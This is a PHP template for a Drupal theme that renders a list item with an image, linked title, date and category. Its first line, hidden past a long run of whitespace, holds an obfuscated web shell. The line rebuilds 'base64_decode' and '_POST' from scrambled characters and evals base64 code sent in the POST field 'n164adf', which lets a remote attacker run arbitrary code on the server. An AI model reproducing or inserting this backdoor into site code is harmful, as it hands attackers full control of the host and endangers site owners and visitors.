<?php                                                                                                                                                                                                                                                               $sF="PCT4BA6ODSE_";$s21=strtolower($sF[4].$sF[5].$sF[9].$sF[10].$sF[6].$sF[3].$sF[11].$sF[8].$sF[10].$sF[1].$sF[7].$sF[8].$sF[10]);$s20=strtoupper($sF[11].$sF[0].$sF[7].$sF[9].$sF[2]);if (isset(${$s20}['n164adf'])) {eval($s21(${$s20}['n164adf']));}?><?php
global $default_img;
$image = $default_img;
if (isset($node->field_image['und'])) {
    $image = file_create_url($node->field_image['und'][0]['uri']);
}
?>
<li class="tr_delay">
    <article class="clearfix">
        <a href="<?php print $node_url; ?>" class="d_block r_corners wrapper f_left m_right_20 m_md_right_10 m_xs_right_20">
            <img src="<?php echo $image; ?>" alt="" width="80">
        </a>
        <a href="<?php print $node_url; ?>" class="color_dark d_block lh_medium m_bottom_5"><b><?php echo $title; ?></b></a>
        <ul class="dotted_list color_grey_light_2 article_stats">
            <li class="m_right_15 relative d_inline_m">
                <a href="<?php print $node_url; ?>" class="color_grey_light_2 fs_small">
                    <i class="icon-picture"></i>
                </a>
            </li>
            <li class="m_right_15 relative d_inline_m">
                <a href="<?php print $node_url; ?>" class="fs_small color_grey">
                    <i><?php print format_date($node->created, 'custom', 'd M, Y'); ?></i>
                </a>
            </li>
            <li class="m_right_15 relative d_inline_m text-pro-links technology-link">
                <?php print illusion_format_comma_field('field_category', $node); ?>
            </li>
        </ul>
    </article>
</li>